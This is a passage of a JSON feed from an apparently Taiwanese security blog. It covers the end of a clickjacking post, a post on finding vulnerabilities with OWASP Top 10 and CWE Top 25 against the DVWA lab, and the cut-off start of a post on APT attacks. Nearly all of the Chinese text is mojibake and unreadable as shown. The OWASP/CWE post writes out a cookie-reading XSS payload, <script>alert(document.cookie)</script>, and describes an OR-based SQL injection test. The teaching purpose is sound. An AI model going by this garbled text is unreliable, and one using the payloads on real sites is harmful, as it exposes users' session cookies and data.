çš„é¢¨éšªã€‚</p>\n<p>æˆ–æ˜¯æˆ‘çŒœå¯èƒ½ä¹Ÿæœƒæ ¹æ“šç¶²ç«™çš„ä¾†æºæ±ºå®šæ˜¯å¦æœ‰é€™å€‹è¡Œç‚ºï¼Œèˆ‰ä¾‹ä¾†èªªåœ¨ä¸€äº›æ¯”è¼ƒæœ‰ä¿¡è­½çš„ç¶²ç«™ï¼Œå¯èƒ½å°±ä¸æœƒè·³å‡ºé€™å€‹ popupã€‚</p>\n<p>æˆ‘æœ‰åšäº†ä¸€å€‹ç°¡å–®çš„ demo ç¶²é ï¼š<a href=\"https://aszx87410.github.io/demo/clickjacking/like.html\">https://aszx87410.github.io/demo/clickjacking/like.html</a></p>\n<p>å¦‚æœ likejacking æˆåŠŸçš„è©±ï¼Œé»äº†æŒ‰éˆ•ä¹‹å¾Œæœƒå° Facebook Developer Plugin çš„ç²‰å°ˆæŒ‰è®šï¼ˆæˆ‘è‡ªå·±å¯¦é©—æ˜¯æœ‰æˆåŠŸå•¦ï¼‰ï¼Œå¤§å®¶å¯ä»¥è©¦è©¦çœ‹ï¼ŒæŒ‰å®Œä»¥å¾Œå¯ä»¥æŒ‰ã€Œé¡¯ç¤ºåŸå§‹ç¶²é ã€çœ‹çœ‹æŒ‰éˆ•åº•ä¸‹é•·ä»€éº¼æ¨£å­ï¼Œé †ä¾¿æŠŠè®šæ”¶å›ä¾†ã€‚</p>\n<h2 id=\"%E7%B8%BD%E7%B5%90\"><a class=\"direct-link\" href=\"#%E7%B8%BD%E7%B5%90\">#</a> ç¸½çµ</h2>\n<p>æ¯”èµ·ä»¥å‰ç€è¦½å™¨æ”¯æ´åº¦é‚„æ²’æœ‰é€™éº¼å®Œæ•´çš„æ™‚ä»£ï¼Œç¾åœ¨å·²ç¶“å¹¸ç¦è¨±å¤šäº†ï¼Œç€è¦½å™¨ä¹Ÿå¯¦ä½œäº†æ„ˆä¾†æ„ˆå¤šçš„å®‰å…¨æ€§åŠŸèƒ½ä»¥åŠæ–°çš„ response headerï¼Œé€éç€è¦½å™¨ä¿è­·ä½¿ç”¨è€…é¿å…æƒ¡æ„æ”»æ“Šã€‚</p>\n<p>é›–ç„¶èªªå¹³å‡ä¾†è¬› clickjacking çš„æ”»æ“Šé›£æ˜“åº¦ã€å…ˆå‚™æ¢ä»¶ä»¥åŠå½±éŸ¿ç¨‹åº¦é€šå¸¸éƒ½æ¯” XSS æˆ–æ˜¯ CSRF ä¹‹é¡çš„æ”»æ“Šä¾†å¾—ä½ï¼Œä½†ä¾ç„¶æ˜¯ä¸å¯å¿½è¦–çš„é¢¨éšªä¹‹ä¸€ã€‚</p>\n<p>å¦‚æœä½ çš„ç¶²é æ²’æœ‰è¦è®“åˆ¥çš„ç¶²ç«™åµŒå…¥ï¼Œè¨˜å¾—è¨­ç½® <code>X-Frame-Options: DENY</code> ä»¥åŠ <code>Content-Security-Policy: frame-ancestors 'none'</code>ï¼Œå‘Šè¨´ç€è¦½å™¨ä½ çš„ç¶²é ä¸èƒ½è¢«åµŒå…¥ï¼Œè—‰æ­¤é˜²æ­¢é»æ“ŠåŠ«æŒæ”»æ“Šã€‚</p>\n<p>åƒè€ƒè³‡æ–™ï¼š</p>\n<ol>\n<li><a href=\"https://github.com/reddelexc/hackerone-reports/blob/master/tops_by_bug_type/TOPCLICKJACKING.md\">TOPCLICKJACKING.md</a></li>\n<li><a href=\"https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html#x-frame-options-header-types\">Clickjacking Defense Cheat Sheet</a></li>\n<li><a href=\"https://content-security-policy.com/frame-ancestors/\">CSP frame-ancestors</a></li>\n</ol>\n",
      "date_published": "2021-08-26T08:00:00+08:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/nick/owasp-cwe/",
      "url": "https://tech-blog.cymetrics.io/posts/nick/owasp-cwe/",
      "title": "è³‡å®‰è¦ç¯„å¯¦æˆ°ç¯‡ : OWASP + CWE",
      "content_html": "<p><img src=\"/img/posts/nick/owasp-cwe/owasp_1.jpg\" alt=\"\"></p>\n<h2 id=\"%E5%89%8D%E8%A8%80\"><a class=\"direct-link\" href=\"#%E5%89%8D%E8%A8%80\">#</a> å‰è¨€</h2>\n<!-- summary -->\n<p>æ²’æœ‰äººå¸Œæœ›è‡ªå·±çš„ç¶²ç«™è¢«æ”»æ“Šï¼Œä½†å·¥ç¨‹å¸«æƒ³åšå¥½è³‡å®‰é˜²è­·å°±åƒå»šå¸«æƒ³ç‡’å‡ºä¸€æ¡Œå¥½èœï¼Œå‰›é–‹å§‹æƒ³åƒè€ƒé£Ÿè­œä¾†åšèœï¼Œç™¼ç¾é£Ÿè­œç¨®é¡å¥½å¤šï¼ŒåŒä¸€é“èœæœ‰å¥½å„å¼å„æ¨£çš„åšæ³•ï¼Œåˆ°åº•è©²æ€éº¼é¸æ€éº¼åšæ‰å° ?</p>\n<p>é¸æ“‡å¤ªå¤šæœƒè®“é–‹ç™¼äººå“¡ä¸€é™£æ··äº‚ï¼Œæœ¬æ–‡çš„ç›®æ¨™å°±æ˜¯æ•´ç† 2 å€‹ç”±ååœ‹éš›çµ„ç¹”æ•´ç†å‡ºä¾†å°è³‡å®‰æ¼æ´çš„æ’åèˆ‡åˆ†é¡ï¼Œç„¶å¾Œè—‰ç”±é¶ç«™ä¾†ç¤ºç¯„å¦‚ä½•åˆ©ç”¨é€™äº›è³‡æ–™ï¼Œå¿«é€Ÿçš„æ‰¾ç¶²ç«™å¯èƒ½çš„æ¼æ´èˆ‡ä¿®è£œå»ºè­°ã€‚</p>\n<!-- summary -->\n<h2 id=\"%E6%9C%89%E9%82%A3%E4%BA%9B%E8%B3%87%E5%AE%89%E8%A6%8F%E7%AF%84-%3F\"><a class=\"direct-link\" href=\"#%E6%9C%89%E9%82%A3%E4%BA%9B%E8%B3%87%E5%AE%89%E8%A6%8F%E7%AF%84-%3F\">#</a> æœ‰é‚£äº›è³‡å®‰è¦ç¯„ ?</h2>\n<p>è¦å…ˆçœ‹æ‡‚é£Ÿè­œæ‰æœ‰è¾¦æ³•åšèœ ! æ‰€ä»¥é€™é‚Šä»‹ç´¹ 2 çµ„ç”±çŸ¥ååœ‹éš›çµ„ç¹”æ•´ç†å‡ºä¾†çš„å¸¸è¦‹è³‡å®‰å•é¡Œæ’åï¼Œç„¶å¾Œåˆ©ç”¨çŸ¥åé¶ç«™ DVWA(è¨»1) ä¾†ç¤ºç¯„å¦‚ä½•åˆ©ç”¨é€™äº›è³‡è¨Šï¼Œé”åˆ°å¿«é€Ÿæ‰¾å‡ºç¶²ç«™å¸¸è¦‹å•é¡Œçš„ç›®çš„ã€‚</p>\n<h3 id=\"owasp-top-10%EF%BC%88open-web-application-security-project%EF%BC%89\"><a class=\"direct-link\" href=\"#owasp-top-10%EF%BC%88open-web-application-security-project%EF%BC%89\">#</a> OWASP TOP 10ï¼ˆOpen Web Application SecurityÂ Projectï¼‰</h3>\n<ul>\n<li><strong>ç°¡ä»‹</strong>:<br>\nè—‰ç”±ç¤¾ç¾¤çš„åŠ›é‡è’é›†å„ç¨®ç¶²é å®‰å…¨æ¼æ´ï¼Œæ­¸ç´å‡ºå®¹æ˜“æ”»æ“Šçš„å¼±é»ï¼Œå®šæœŸå½™æ•´å‡ºå‰ 10 å¤§è³‡å®‰å•é¡Œï¼Œæ›´æ–°é »ç‡è¼ƒé«˜ï¼ˆ2~4 å¹´ï¼‰ã€‚</li>\n<li><strong>å‘½åæ–¹å¼</strong>:<br>\næ’å + ç™¼å¸ƒå¹´ä»½ + æ¼æ´åç¨±<br>\nÂ ex. A1:2017-Injection ï¼ˆ2017 å¹´æ’åç¬¬ 1 çš„æ¼æ´ç‚ºæ³¨å…¥å•é¡Œï¼‰</li>\n<li><strong>ä½¿ç”¨ç¯„ä¾‹</strong>:\n<ol>\n<li>\n<p><strong>é¸æ“‡è¦æª¢æŸ¥çš„å•é¡Œ</strong>:<br>\nåˆ° Owap Top 10 (<a href=\"https://owasp.org/www-project-top-ten/\">https://owasp.org/www-project-top-ten/</a>)é»é¸è¦æŸ¥è©¢çš„é¡å‹ï¼Œé€™é‚Šé¸æ’åç¬¬ä¸€çš„ Injection å•é¡Œç‚ºç•¶ç¯„ä¾‹ã€‚<img src=\"/img/posts/nick/owasp-cwe/owasp_2.jpg\" alt=\"\"></p>\n</li>\n<li>\n<p><strong>æ‰¾å‡ºå•é¡Œç™¼ç”Ÿç‰¹å¾µ</strong>:<br>\né»é€²å»æ‰¾ä¸€ä¸‹å•é¡Œå¯èƒ½ç™¼ç”Ÿåœ¨å“ªè£¡ï¼Œæˆ–æ˜¯å¦‚ä½•åˆ†è¾¨å•é¡Œï¼Œç¯„ä¾‹ä¸­å¾ Attack Vectors çš„æ•˜è¿°å¾—çŸ¥ Injection é¡å‹çš„å•é¡Œåªè¦åœ¨æœ‰è¼¸å…¥çš„åœ°æ–¹éƒ½æœ‰å¯èƒ½ç™¼ç”Ÿã€‚<img src=\"/img/posts/nick/owasp-cwe/owasp_3.jpg\" alt=\"\"></p>\n</li>\n<li>\n<p><strong>æ‰¾å‡ºå¯èƒ½çš„å•é¡Œé»</strong>:<br>\nåˆ°è‡ªå·±çš„ç¶²ç«™æ‰¾å‡ºæ‰€æœ‰å¯ç–‘çš„åœ°æ–¹ï¼Œç¯„ä¾‹ä¸­æ˜¯ DVWA æº–å‚™å¥½çš„ SQL Injection å¼±é»è¼¸å…¥ä½ç½®ï¼Œè©²ä½ç½®åŸæœ¬çš„åŠŸèƒ½æ˜¯è¼¸å…¥ ID ç·¨è™Ÿä¾†æŸ¥è©¢ç”¨æˆ¶è³‡æ–™ï¼Œå¯¦éš›ä¸Šæ¸¬è©¦çš„æ™‚å€™æ‡‰è©²è¦æŠŠå…¨éƒ¨çš„å•é¡Œé»éƒ½æ‰¾å‡ºä¾†ã€‚<img src=\"/img/posts/nick/owasp-cwe/owasp_4.jpg\" alt=\"\"></p>\n</li>\n<li>\n<p><strong>æ¸¬è©¦æ˜¯å¦çœŸçš„æœ‰å¼±é»</strong>:<br>\nå°è¼¸å…¥é»é€²è¡Œæ¸¬è©¦ä¾†é©—è­‰æ˜¯å¦çœŸçš„æœ‰å¼±é»(å¦‚æœå°è©²å¼±é»ä¸ç†Ÿæ‚‰çš„è©±å¯ä»¥åƒè€ƒ Owasp ä¸­çš„ Example Attack Scenarios æ¬„ä½)ï¼Œç¯„ä¾‹ä¸­æ˜¯é¶ç«™æº–å‚™å¥½çš„ SQL Injection å¼±é»ï¼Œæ”»æ“Šæ–¹æ³•æ˜¯é¸è‡ª Owasp çš„ Example ä¸­åˆ©ç”¨ SQL èªæ³•çš„ OR ä¾†å°å‡ºæ‰€æœ‰è³‡æ–™ã€‚<br>\n4-1. Owasp æä¾›çš„ Injection å¼±é»ç¯„ä¾‹<img src=\"/img/posts/nick/owasp-cwe/owasp_5.jpg\" alt=\"\"><br>\n4-2. DVWA Injection å¼±é»æ”»æ“Šæ¸¬è©¦<img src=\"/img/posts/nick/owasp-cwe/owasp_6_2.jpg\" alt=\"\"></p>\n</li>\n<li>\n<p><strong>å˜—è©¦ä¿®å¾©ç™¼ç¾çš„å•é¡Œ</strong>:<br>\nåƒè€ƒ Owasp ä¸­ How to Prevent æ¬„ä½æä¾›çš„å»ºè­°é€²è¡Œä¿®å¾©ã€‚<img src=\"/img/posts/nick/owasp-cwe/owasp_7.jpg\" alt=\"\"></p>\n</li>\n</ol>\n</li>\n</ul>\n<h3 id=\"cwe-%2F-sans-top-25-%EF%BC%88common-weakness-enumeration%EF%BC%89\"><a class=\"direct-link\" href=\"#cwe-%2F-sans-top-25-%EF%BC%88common-weakness-enumeration%EF%BC%89\">#</a> CWE / SANS TOP 25 ï¼ˆCommon Weakness Enumerationï¼‰</h3>\n<ul>\n<li>ç°¡ä»‹:<br>\nç”±åœ‹éš›çµ„ç¹” MITRE ä¸»å°ï¼Œé€éå° SANS èˆ‡å…¶ä»–è³‡å®‰å°ˆå®¶é€²è¡Œè¨ªè«‡èª¿æŸ¥ä¾†åˆ¶å®šé€šç”¨ç¼ºé™·åˆ—è¡¨ï¼Œå½™æ•´ç‚ºå‰ 25 å¤§è³‡å®‰å•é¡Œï¼Œæ›´æ–°é »ç‡è¼ƒä½ï¼ˆ8 å¹´ï¼‰ã€‚</li>\n<li>å‘½åæ–¹å¼:<br>\nç™¼ç¾é †åº + æ¼æ´åç¨±<br>\nÂ ex. CWE-79 Cross-site ScriptingÂ (XSS)<br>\nï¼ˆ2021 å¹´æ’åç¬¬ 2 çš„æ¼æ´ç‚ºè·¨ç«™è…³æœ¬ï¼Œæ’åéœ€æŸ¥è¡¨ï¼‰</li>\n<li><strong>ä½¿ç”¨ç¯„ä¾‹</strong>:\n<ol>\n<li>\n<p><strong>é¸æ“‡è¦æª¢æŸ¥çš„å•é¡Œ</strong>:<br>\nåˆ° CWE Top 25 (<a href=\"https://cwe.mitre.org/top25/archive/2020/2020_cwe_top25.html\">https://cwe.mitre.org/top25/archive/2020/2020_cwe_top25.html</a>)é»é¸è¦æŸ¥æ‰¾çš„å•é¡Œï¼Œé€™é‚Šä»¥æ’åç¬¬ä¸€çš„ Cross-site Scripting å•é¡Œç‚ºä¾‹ã€‚<img src=\"/img/posts/nick/owasp-cwe/owasp_8.jpg\" alt=\"\"></p>\n</li>\n<li>\n<p><strong>æ‰¾å‡ºå•é¡Œç™¼ç”Ÿç‰¹å¾µ</strong>:<br>\nå¾æ•˜è¿°ä¸­æ‰¾å‡ºé—œæ–¼å•é¡Œç™¼ç”Ÿé»çš„è³‡è¨Š<img src=\"/img/posts/nick/owasp-cwe/owasp_9.jpg\" alt=\"\"></p>\n</li>\n<li>\n<p><strong>æ‰¾å‡ºæ‰€æœ‰å¯èƒ½çš„å•é¡Œé»</strong>:<br>\nåˆ°è‡ªå·±çš„ç¶²ç«™æ‰¾å‡ºæ‰€æœ‰å¯ç–‘çš„åœ°æ–¹ï¼Œç¯„ä¾‹ä¸­æ˜¯ DVWA æº–å‚™å¥½çš„ XSS å¼±é»è¼¸å…¥ä½ç½®ï¼Œè©²ä½ç½®åŸæœ¬çš„åŠŸèƒ½æ˜¯å°‡è¼¸å…¥æ–‡å­—é¡¯ç¤ºå‡ºä¾†ï¼Œå¯¦éš›ä¸Šæ¸¬è©¦çš„æ™‚å€™æ‡‰è©²è¦æŠŠå…¨éƒ¨çš„å•é¡Œé»éƒ½æ‰¾å‡ºä¾†ã€‚<img src=\"/img/posts/nick/owasp-cwe/owasp_10.jpg\" alt=\"\"></p>\n</li>\n<li>\n<p><strong>é€å€‹æ¸¬è©¦æ˜¯å¦çœŸçš„æœ‰å¼±é»</strong>:<br>\nå°è¼¸å…¥é»é€²è¡Œæ¸¬è©¦ä¾†é©—è­‰æ˜¯å¦çœŸçš„æœ‰å¼±é»(å¦‚æœå°è©²å¼±é»ä¸ç†Ÿæ‚‰çš„è©±å¯ä»¥åƒè€ƒ CWE ä¸­çš„ Demonstrative Examples æ¬„ä½)ï¼Œç¯„ä¾‹ä¸­æ˜¯é¶ç«™æº–å‚™å¥½çš„ XSS å¼±é»ï¼Œæ”»æ“Šæ–¹æ³•æ˜¯åƒè€ƒ CWE çš„ Example ä¸­åˆ©ç”¨ JS èªæ³•çš„ Alert ä¾†å½ˆå‡ºè¦–çª—ï¼Œä½†é€™é‚Šé€²è¡Œæ·±å…¥ä¸€é»çš„æ”»æ“Šè—‰ç”±å½ˆå‡ºè¦–çª—çš„æ©Ÿæœƒå°å‡ºè¼ƒæ•æ„Ÿçš„ Cookie è³‡è¨Šã€‚<br>\n4-1. CWE æä¾›çš„ XSS å¼±é»ç¯„ä¾‹<img src=\"/img/posts/nick/owasp-cwe/owasp_11.jpg\" alt=\"\"><br>\n4-2. è¼¸å…¥ä¸‹åˆ— script é€²è¡Œæ”»æ“Šæ¸¬è©¦<br>\n<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code><img src=\"/img/posts/nick/owasp-cwe/owasp_12.jpg\" alt=\"\"><br>\n4-3. æ”»æ“Šçµæœ<img src=\"/img/posts/nick/owasp-cwe/owasp_13.jpg\" alt=\"\"></p>\n</li>\n<li>\n<p><strong>å˜—è©¦ä¿®å¾©ç™¼ç¾çš„å•é¡Œ</strong>:<br>\nåƒè€ƒ CWE ä¸­ Potential Mitigations æ¬„ä½ä¸­çš„å»ºè­°é€²è¡Œä¿®å¾©ã€‚<br>\n<img src=\"/img/posts/nick/owasp-cwe/owasp_14.jpg\" alt=\"\"></p>\n</li>\n</ol>\n</li>\n</ul>\n<h2 id=\"%E6%9C%89%E5%95%8F%E9%A1%8C%E5%85%88%E6%89%BE%E8%AA%B0-%3F\"><a class=\"direct-link\" href=\"#%E6%9C%89%E5%95%8F%E9%A1%8C%E5%85%88%E6%89%BE%E8%AA%B0-%3F\">#</a> æœ‰å•é¡Œå…ˆæ‰¾èª° ?</h2>\n<p>OWASP è·Ÿ CWEï¼Œé‡è¦–æ•ˆç‡çš„é–‹ç™¼è€…å¯èƒ½è¦ºå¾— Owasp Top 10 é¸äº†å‰ 10 å¸¸è¦‹çš„å•é¡Œï¼Œå…ˆè§£æ±ºé€™ 10 å€‹å•é¡Œæ‰æ˜¯ CP å€¼æœ€é«˜çš„åšæ³•ï¼Œå¯¦éš›ä¸Šä¸¦éå¦‚æ­¤ï¼ŒåŸå› å°±è—åœ¨é€™å¼µ Owasp Top 10 èˆ‡ CWE Top 25 çš„å°ç…§è¡¨ä¸­ã€‚</p>\n<p><img src=\"/img/posts/nick/owasp-cwe/owasp_15.jpg\" alt=\"\"></p>\n<p>å¾é€™å¼µåœ–å¯ä»¥æ˜é¡¯çœ‹å‡ºä¾†é›–ç„¶ Owasp Top 10 é …ç›®è¼ƒå°‘ï¼Œä½†å®ƒæ¯ä¸€å€‹é …ç›®çš„ç¯„åœè¼ƒå¤§ï¼Œæ›å¥è©±èªªè™•ç† Owasp ä¸æœƒæ¯” CWE å¿«å¤šå°‘ï¼Œå¯¦éš›ä¸Šå«è“‹çš„ç¯„åœå¤§å°æ˜¯å·®ä¸å¤šçš„ï¼Œç•¶ä»Šå¤©ä½ åšè³‡å®‰æª¢æ¸¬ä¸æ˜¯ç‚ºäº†ä¾†è‡ªæ¥­ä¸»çš„åˆè¦éœ€æ±‚æ™‚ï¼Œé¸æ“‡é‚£ä¸€å€‹è¦ç¯„å„ªå…¶å¯¦æ˜¯ç”±ç›®çš„ä¾†æ±ºå®šçš„ã€‚</p>\n<p>ç•¶ä½¿ç”¨è€…æ“”å¿ƒè‡ªå·±çš„ç¶²ç«™æœ‰è³‡å®‰å•é¡Œï¼Œæƒ³è¦è§£æ±ºæ‰å•é¡Œçš„æ™‚å€™æœƒæ¨è–¦å…ˆæ‰¾ CWE ï¼Œå› ç‚ºå®ƒçš„é …ç›®åˆ†çš„æ¯”è¼ƒç´°ï¼Œèªªæ˜èˆ‡è§£æ±ºæ–¹æ¡ˆæ¯”èµ· Owasp æ¯”ä¾†æ›´å…·æœ‰é‡å°æ€§ï¼Œæ‰€ä»¥è—‰ç”±é€™äº›èªªæ˜è§£æ±ºå•é¡Œçš„æ©Ÿç‡ä¹Ÿæ›´é«˜ï¼Œé€™é‚Šç”¨å…©ç¨®è¦ç¯„æ’åéƒ½å¾ˆé«˜çš„ Injection èˆ‰å€‹ä¾‹å­ï¼Œé–‹ç™¼è€…è‚¯å®šçŸ¥é“è‡ªå·±çš„ç¶²ç«™æœ‰æ²’æœ‰ç”¨åˆ°è³‡æ–™åº«ï¼Œå‡è¨­æœ‰ç”¨åˆ°çš„è©±å°±è¦ç‰¹åˆ¥æ³¨æ„ç¶²ç«™æœ‰æ²’æœ‰ SQL Injection å•é¡Œï¼Œç•¶è¦è—‰ç”±é€™äº›è³‡å®‰è¦ç¯„ä¾†è§£æ±ºå•é¡Œæ™‚ï¼ŒæŸ¥è©¢ <a href=\"https://cwe.mitre.org/data/definitions/89.html\">CWE-89 SQL Injection</a> è£¡é¢çš„è³‡æ–™æœƒæ¯”èµ· <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Owasp A1:2017-Injection</a> æ›´æœ‰æ•ˆç‡ã€‚</p>\n<p>ç•¶ä½¿ç”¨è€…è¦è©•ä¼°ä¸€å€‹ä¸ä¸€å®šæ˜¯è‡ªå·±çš„ç¶²ç«™åˆ°åº•å®‰ä¸å®‰å…¨ï¼Œå‰‡æœƒå»ºè­°å…ˆç”¨ Owaspï¼Œä¸€æ¨£ç”¨ Injection ä¾†èˆ‰ä¸€å€‹ä¾‹å­ï¼Œç•¶ä½ ä»Šå¤©ç™¼ç¾åˆ¥äººé–‹ç™¼çš„ç¶²ç«™ä¸Šæœ‰ä¸€å€‹è¼¸å…¥æ¬„ä½æ²’æœ‰é€²è¡Œä»»ä½•æª¢æŸ¥ï¼Œå¯ä»¥è¼¸å…¥æ‰€æœ‰ç¨®è™Ÿçš„ç‰¹æ®Šç¬¦è™Ÿï¼Œä½†ä½ ä¸ç¢ºå®šå¾Œé¢ç”¨çš„æ˜¯å“ªç¨®æŠ€è¡“æˆ–å¥—ä»¶ï¼Œé€™æ™‚å€™ <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Owasp A1:2017-Injection</a> å°±æœ‰é—œæ–¼ Injection çš„æ•´é«”è©•ä¼°å’Œåˆ†æå¾Œé¢å¯èƒ½ç”¨äº†å“ªäº›å¥—ä»¶æœƒå°è‡´å•é¡Œç™¼ç”Ÿï¼Œè€Œ CWE çš„è©±é‚„è¦æƒ³è¾¦æ³•åšé€²ä¸€æ­¥æ¸¬è©¦æ‰èƒ½ç¢ºå®šå±¬æ–¼é‚£ä¸€å€‹é¡å‹ã€‚</p>\n<h2 id=\"%E7%B8%BD%E7%B5%90\"><a class=\"direct-link\" href=\"#%E7%B8%BD%E7%B5%90\">#</a> ç¸½çµ</h2>\n<p>åˆ†äº«ä¸€ä¸‹å°æ–¼ç¶²ç«™é–‹ç™¼äººå“¡å»ºè­°çš„è³‡å®‰æª¢è¦–æ­¥é©Ÿï¼Œèˆ‡å„é¡æ¨™æº–ä½¿ç”¨æ™‚æ©Ÿã€‚</p>\n<p><strong>1. ç¢ºèªé–‹ç™¼å·¥å…·èˆ‡å¥—ä»¶ç‰ˆæœ¬Â : CVE</strong><br>\nåœ¨é–‹ç™¼ä¹‹å‰è«‹å…ˆå»åˆ° CVE Details æŸ¥ä¸€ä¸‹ç”¨åˆ°çš„å·¥å…·æˆ–å¥—ä»¶æ˜¯å¦å·²æœ‰å¼±é»ï¼Œç”¨äº†æœ‰å¼±é»çš„å¥—ä»¶æˆ–å·¥å…·é–‹ç™¼é«˜æ©Ÿç‡å°è‡´ç¶²ç«™å…ˆå¤©ä¸è‰¯ï¼Œå¦‚æœéç”¨ä¸å¯å‰‡éœ€è¦æŠŠå¼±é»è—å¥½æˆ–é¿é–‹æœ‰å¼±é»çš„åŠŸèƒ½ã€‚</p>\n<p><strong>2. é¿é–‹å¸¸è¦‹å¼±é»Â : OWASP TOP 10, CWE TOP 25</strong><br>\nå¾é–‹å§‹é–‹ç™¼åˆ°å®Œæˆé€™å€‹éšæ®µç‰¹åˆ¥è¦æ³¨æ„é¿é–‹å¸¸è¦‹çš„è³‡å®‰å•é¡Œï¼Œç•¢ç«Ÿè³‡å®‰è¦åšåˆ°å®Œç¾æˆæœ¬éé«˜ï¼Œä¸€èˆ¬ç¶²ç«™å¾ˆé›£åšåˆ° 100 åˆ†ï¼Œä½†è§£æ±ºå¸¸è¦‹å¼±é»èƒ½å¤§å¹…çš„å¢åŠ é§­å®¢æ”»æ“Šæˆæœ¬ï¼Œä½ å®¶çš„é–åªè¦æ¯”é„°å±…å®¶çš„é–æ›´å¥½ï¼Œå°å·å°±ä¸å–œæ­¡åˆ°ä½ å®¶å·æ±è¥¿ï¼Œæ²’æœ‰äººé¡˜æ„æŠŠæ™‚é–“åœ¨é›£æçš„ç›®æ¨™ä¸Šï¼Œé§­å®¢ä¹Ÿæ˜¯ä¸€æ¨£ã€‚</p>\n<p><strong>3. å®‰å…¨æ€§æ¸¬è©¦(æ¨¡æ“¬æ”»æ“Šï¼‰Â : ATT&amp;CK</strong><br>\nä¸ç®¡æ˜¯è™•ç†å®Œå¼±é»æˆ–å»ºç«‹å¥½é˜²è­·å¾Œéƒ½éœ€è¦ä¸€å€‹é©—è­‰çš„æ©Ÿåˆ¶ï¼Œæ¨¡æ“¬ä¸€ä¸‹é§­å®¢çš„æ”»æ“Šæ˜¯å¦æœƒæˆåŠŸï¼Œé¿å…åšäº†ç™½å·¥å»ä¸è‡ªçŸ¥ï¼Œé€™æ™‚å€™æœ€å¥½çš„æ–¹æ³•æ˜¯äº¤çµ¦ç¬¬ä¸‰æ–¹çš„è³‡å®‰å» å•†ä¾†åšæ¸¬è©¦ï¼Œä¸åªæœ‰å°ˆæ¥­çš„è³‡å®‰äººå“¡ç‚ºä½ æœå‹™ï¼Œä¹Ÿèƒ½é¿å…æ¸¬è©¦æ™‚çƒå“¡å…¼è£åˆ¤çš„å•é¡Œï¼Œä½†ç¤™æ–¼æˆæœ¬è€ƒé‡æˆ–è€…ç¶²ç«™å±¬æ–¼ä¸å¯å…¬é–‹çš„å…§éƒ¨ç³»çµ±ï¼Œå°±æ¨è–¦åƒè€ƒ ATT&amp;CK ä¾†è‡ªè¡Œå»ºç«‹ä¸€å€‹è¼ƒå…¨é¢çš„æ¸¬è©¦ï¼Œé™ä½å‰è¿°å•é¡Œå¸¶ä¾†çš„å½±éŸ¿ã€‚</p>\n<p>æœ¬æ–‡ä¸»è¦ä»‹ç´¹çš„å…§å®¹èˆ‡ç¬¬ 2 é …é¿é–‹å¸¸è¦‹å¼±é»æœ‰æ¯”è¼ƒç›´æ¥çš„é—œä¿‚ï¼Œé€™éƒ¨ä»½æ˜¯èˆ‡é–‹ç™¼æœ€ç›¸é—œä¹Ÿæ˜¯å½±éŸ¿æœ€å¤§çš„ä¸€éƒ¨åˆ†ï¼Œä¹‹å¾Œæœ‰æ©Ÿæœƒåœ¨åˆ†äº«æœ‰é—œç¬¬ 1 é …èˆ‡ç¬¬ 3 é …ä¸­ç”¨åˆ°çš„å…¶ä»–é¡å‹è³‡å®‰è¦ç¯„ã€‚</p>\n<h2 id=\"%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99\"><a class=\"direct-link\" href=\"#%E5%8F%83%E8%80%83%E8%B3%87%E6%96%99\">#</a> åƒè€ƒè³‡æ–™</h2>\n<blockquote>\n<p><a href=\"https://owasp.org/\">https://owasp.org/</a><br>\n<a href=\"https://cwe.mitre.org/\">https://cwe.mitre.org/</a><br>\n<a href=\"https://cve.mitre.org/\">https://cve.mitre.org/</a><br>\n<a href=\"https://www.cvedetails.com/\">https://www.cvedetails.com/</a><br>\n<a href=\"https://attack.mitre.org/\">https://attack.mitre.org/</a></p>\n</blockquote>\n",
      "date_published": "2021-08-23T08:00:00+08:00"
    },{
      "id": "https://tech-blog.cymetrics.io/posts/jo/zerobased-APT/",
      "url": "https://tech-blog.cymetrics.io/posts/jo/zerobased-APT/",
      "title": "é›¶åŸºç¤è³‡å®‰ç³»åˆ—ï¼ˆå…­ï¼‰- é›»å½±ä¸­é…·é§­å®¢åšçš„äº‹ï¼Ÿé—œæ–¼ APTï¼ˆAdvanced Persistent Threatï¼‰",
      "content_html": "<!-- summary -->\n<h2 id=\"%E5%89%8D%E8%A8%80\"><a class=\"direct-link\" href=\"#%E5%89%8D%E8%A8%80\">#</a> å‰è¨€</h2>\n<blockquote>\n<p><strong>é›»å½±ä¸­çš„é§­å®¢åªæ˜¯æ•²æ•²æ‰“æ‰“å¹¾åˆ†é˜å°±å¯ä»¥ç«Šå–å•†æ¥­æ©Ÿå¯†ï¼Ÿï¼</strong><br>\nç­”æ¡ˆæ˜¯ä½†ä¹Ÿä¸æ˜¯ï¼Œç‚ºä»€éº¼æœƒé€™éº¼èªªå‘¢ï¼Ÿ<br>\næˆåŠŸçš„æ”»æ“Šçµæœä¹Ÿè¨±åªéœ€è¦çŸ­çŸ­çš„å¹¾åˆ†é˜å°±èƒ½å°‡å•†æ¥­æ©Ÿå¯†å¸¶èµ°ï¼Œä½†åœ¨é§­å®¢æ•²éµç›¤çš„é‚£å¹¾åˆ†é˜ä¹‹å‰ï¼Œå…¶å¯¦å°±å·²ç¶“èŠ±äº†å¥½å¹¾å€‹æœˆç”šè‡³ä»¥å¹´è¨˜çš„æ™‚é–“ä¾†ä½ˆå±€é€™å¹¾åˆ†é˜çš„æ”»æ“Šï¼Œé‚£é§­å®¢çš„ä½ˆå±€åˆ°åº•æ˜¯åœ¨ä½ˆå±€ä»€éº¼å‘¢ï¼Œé€™å°±æ˜¯ä»Šå¤©æƒ³å’Œå¤§å®¶åˆ†äº«çš„ï¼Œé›»å½±ä¸­é‚£äº›é…·é§­å®¢åœ¨å®Œæˆæ”»æ“Šå‰æ‰€åšçš„äº‹ã€‚</p>\n</blockquote>\n<!-- summary -->\n<h2 id=\"%E9%87%8B%E4%BE%8B\"><a class=\"direct-link\" href=\"#%E9%87%8B%E4%BE%8B\">#</a> é‡‹ä¾‹</h2>\n<p>é›»å½±ä¸­ï¼Œé§­å®¢æ‰€åŸ·è¡Œçš„æ–¹å¼ï¼Œå…¶å¯¦åœ¨æ¥­ç•Œç¨±ä¹‹ç‚º<strong>é€²éšæŒçºŒæ€§å¨è„…ï¼ˆAdvanced Persistent Threatï¼‰</strong> ä¹Ÿå°±æ˜¯æ‰€è¬‚çš„ APTï¼Œé‚£é€™ç¨®æ”»æ“Šå²å®³åœ¨å“ªå‘¢ï¼Ÿ<br>\nå…¶å¯¦ APT 